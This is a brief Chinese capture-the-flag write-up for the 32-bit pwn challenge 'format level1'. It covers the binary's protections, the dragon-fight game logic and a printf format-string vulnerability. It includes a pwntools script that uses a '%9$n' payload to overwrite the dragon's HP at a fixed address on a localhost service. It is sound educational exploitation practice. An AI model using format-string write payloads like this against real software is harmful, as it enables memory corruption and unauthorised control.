# format level1

## 文件分析

下载`format_level1`, NX on, PIE off, Canary on, RELRO full  
ghidra分析为32位程序

## 逆向

程序员斗恶龙的故事开始了！由于我们先攻击龙，
所以我们的目标是我们的atk>龙的hp即可  
程序中我们的初始atk为1，而龙的hp为10M，每次沉淀可以增加1点atk  
~~那么只要沉淀10,000,000次就可以秒杀恶龙了~~  
程序中存在printf漏洞，将大数字注入atk较难，但将小数字注入hp却较简单，
只要将龙的血量置1，就可以达成目标，拿到flag

程序未开启PIE，所以地址没有偏移，方便直接注入；
通过gdb调试可知，`talk`函数中printf漏洞的str位于栈上第7个，
由此可构造如下exp进行血量修改

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 38469)
sh.sendline(b'2') # 练习时长1坤年，作者也是小黑子
sh.sendline(b'3') # talk with dragon
dragonhpAddr = 0x0804c00c
sh.sendline(b'0%9$n000' + p32(dragonhpAddr)) # write 1 to addr (1x'0')
sh.sendline(b'1') # attack the dragon
sh.interactive()
```

> 注：arg7:'0%9$', arg8:'n000', arg9:dragonAddr；所有0都是占位符，无实际含义

这道题构造payload时出了点小问题：sendline太快，最后的`1`没读到，
要重新打，服务器读取问题要考虑！遇到这种情况就要使用sendlineafter()

Done.
